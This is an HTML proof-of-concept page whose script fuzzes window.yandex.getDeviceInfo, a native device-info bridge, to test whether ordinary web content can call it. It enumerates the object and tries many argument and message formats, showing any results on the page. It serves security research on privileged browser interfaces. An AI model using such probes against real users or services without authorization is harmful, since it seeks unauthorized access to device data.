<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>PoC - window.yandex.getDeviceInfo fuzz</title>

  <style>
    body {
      font-family: sans-serif;
      padding: 16px;
    }
    h1 {
      margin: 0 0 8px 0;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      background: #111;
      color: #0f0;
      padding: 12px;
      border-radius: 8px;
    }
    button {
      font-size: 16px;
      padding: 10px 14px;
      margin: 8px 8px 8px 0;
    }
  </style>
</head>

<body>
  <h1>getDeviceInfo Bridge Fuzzer</h1>
  <div>Autodiscover object / function / callback / promise / message semantics</div>
  <div>TS: <span id="ts"></span></div>

  <button onclick="run()">Run</button>
  <pre id="out">Ready.</pre>

<script>
(function () {
  document.getElementById("ts").textContent = String(Date.now());
})();

function out(s) {
  const el = document.getElementById("out");
  el.textContent += s + "\n";
}

function setOut(s) {
  document.getElementById("out").textContent = s + "\n";
}

function safe(v) {
  try {
    if (v === undefined) return "undefined";
    if (v === null) return "null";
    if (typeof v === "string") return JSON.stringify(v);
    if (typeof v === "number" || typeof v === "boolean") return String(v);
    if (typeof v === "function")
      return "[function " + (v.name || "anonymous") + "]";
    return String(v);
  } catch (e) {
    return "[unprintable:" + e + "]";
  }
}

function j(o) {
  try {
    return JSON.stringify(o);
  } catch (e) {
    return "[json_fail:" + e + "]";
  }
}

function ownKeys(o) {
  try {
    return Reflect.ownKeys(o);
  } catch (e) {
    return ["<ownKeys error " + e + ">"];
  }
}

function once(fn) {
  let done = false;
  return function () {
    if (done) return;
    done = true;
    return fn.apply(this, arguments);
  };
}

async function tryCall(fn, thisObj, args, label) {
  try {
    const r = fn.apply(thisObj, args);

    if (r && typeof r.then === "function") {
      const v = await r;
      out("[OK] " + label + " (promise) => " + safe(v));
      return { ok: true, value: v };
    }

    out("[OK] " + label + " => " + safe(r));
    return { ok: true, value: r };
  } catch (e) {
    out("[EX] " + label + " threw: " + e);
    return { ok: false, error: e };
  }
}

async function run() {
  setOut("");

  // 1) window.yandex
  let y;
  try {
    y = window.yandex;
  } catch (e) {
    out("ERROR reading window.yandex: " + e);
    return;
  }

  out("typeof window.yandex = " + typeof y);
  if (!y) {
    alert("No window.yandex");
    return;
  }

  // 2) getDeviceInfo symbol
  let g;
  try {
    g = y.getDeviceInfo;
  } catch (e) {
    out("ERROR reading y.getDeviceInfo: " + e);
    return;
  }

  out("typeof y.getDeviceInfo = " + typeof g + " " + safe(g));
  if (!g) {
    alert("No yandex.getDeviceInfo");
    return;
  }

  // 3) Enumerate keys / prototype
  const gKeys = typeof g === "object" ? ownKeys(g) : [];
  out("ownKeys(getDeviceInfo) = " + j(gKeys));

  let proto = null;
  try {
    proto = Object.getPrototypeOf(g);
  } catch (e) {}

  const pKeys = proto ? ownKeys(proto) : [];
  out("ownKeys(getDeviceInfo.__proto__) = " + j(pKeys));

  // 4) Callback
  const cb = once(function (res) {
    out("** CALLBACK RESULT ** " + safe(res));

    try {
      if (typeof res === "string") {
        const parsed = JSON.parse(res);
        out("parsed JSON = " + j(parsed));
      }
    } catch (e) {
      out("parse JSON failed: " + e);
    }

    alert(("DeviceInfo: " + safe(res)).slice(0, 300));
  });

  // 5) Argument fuzz sets
  const argSets = [
    [],
    [cb],
    [{ callback: cb }],
    [{ onResult: cb }],
    [{ success: cb }],
    [{ complete: cb }],
    [{}],
    [{ async: true }],
    [{ format: "json" }],
    [{ verbose: true }],
    [{ source: "web" }],
    [{}, cb],
  ];

  // 6) If function: direct fuzz
  if (typeof g === "function") {
    out("Fuzzing getDeviceInfo as FUNCTION");

    for (let i = 0; i < argSets.length; i++) {
      await tryCall(
        g,
        y,
        argSets[i],
        "getDeviceInfo args#" + i
      );
    }
  }

  // 7) If object: fuzz methods
  if (typeof g === "object") {
    out("Fuzzing getDeviceInfo as OBJECT");

    const methodNames = [
      "get",
      "fetch",
      "query",
      "call",
      "invoke",
      "exec",
      "postMessage",
      "send",
      "run",
      "request",
      ...gKeys,
      ...pKeys,
    ];

    const uniq = [];
    for (const n of methodNames) {
      if (n && !uniq.includes(n)) uniq.push(n);
    }

    out("candidate methods = " + j(uniq));

    for (const name of uniq) {
      let fn;
      try {
        fn = g[name];
      } catch (e) {
        continue;
      }

      if (typeof fn !== "function") continue;

      for (let i = 0; i < argSets.length; i++) {
        await tryCall(
          fn,
          g,
          argSets[i],
          "getDeviceInfo." + name + " args#" + i
        );
      }
    }
  }

  // 8) Message-style payload fuzz
  const payloads = [
    "getDeviceInfo",
    ["getDeviceInfo"],
    { cmd: "getDeviceInfo" },
    { method: "getDeviceInfo" },
    { action: "getDeviceInfo" },
    { type: "getDeviceInfo" },
    { name: "getDeviceInfo" },
    { api: "getDeviceInfo" },
    { namespace: "yandex", cmd: "getDeviceInfo" },
  ];

  if (typeof g === "function") {
    for (let i = 0; i < payloads.length; i++) {
      await tryCall(
        g,
        y,
        [payloads[i], cb],
        "getDeviceInfo payload#" + i
      );
    }
  }

  out("DONE. If nothing fired, bridge is likely origin-gated or signature-locked.");
  alert("Done. Check output.");
}
</script>
</body>
</html>
